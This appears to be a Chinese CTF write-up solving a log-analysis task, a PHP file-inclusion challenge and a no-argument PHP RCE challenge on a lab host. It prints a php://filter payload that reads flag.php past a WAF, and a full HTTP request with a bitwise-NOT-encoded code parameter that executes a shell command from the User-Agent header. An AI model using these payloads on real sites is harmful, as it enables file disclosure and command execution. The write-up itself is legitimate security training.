# what_is_log

查看附件日志，通过上下关联，分析看到数据库登陆的信息

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030217743.gif?x-oss-process=hzy)

即推断flag为PCL{1555a651a13ec074ce725383214fd7cc}

# 简单包含

![image-20220703091710580](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030917682.png?x-oss-process=hzy)

简单的文件包含，测试发现存在waf

![image-20220703091740716](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030917769.png?x-oss-process=hzy)

使用脏数据绕过，成功执行包含文件

```
&flag=php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20220703091822688](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030918728.png?x-oss-process=hzy)

![image-20220703091829686](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030918729.png?x-oss-process=hzy)

PCL{bc58644f-f757-11ec-9edf-5224002d2b29}

# 简单的php

![image-20220703092016853](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030920908.png?x-oss-process=hzy)

简单分析一下代码，是get传参，对传参内容长度加以限制，并且过滤了字母和数字，整体来看这题考察的是无参数rce

写了个脚本进行无参绕过

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030217752.gif?x-oss-process=hzy)

通过绕过可以查看文件

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030217755.gif?x-oss-process=hzy)

最终在ua头修改内容为cat /ffffflaggg的情况下，实现无参rce，得到flag

```
POST /?code=[~%8C%86%8C%8B%9A%92][~%CF]([~%91%9A%87%8B][~%CF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][~%CF]())); HTTP/1.1
Host: 192.168.1.111:8220
User-Agent: cat /ffffflaggg
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.111:8220
Connection: close
Referer: http://192.168.1.111:8220/?code=[~%8C%86%8C%8B%9A%92][!%FF]();
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate
Content-Length: 0
```

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030217767.gif?x-oss-process=hzy)

 

PCL{b35a314f-ff57-13a2-9ad1-002d22deeb2a}

# 总结

24小时的比赛最后定格九十名，还是太菜，继续努力吧

![image-20220703095958984](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207030959071.png?x-oss-process=hzy)
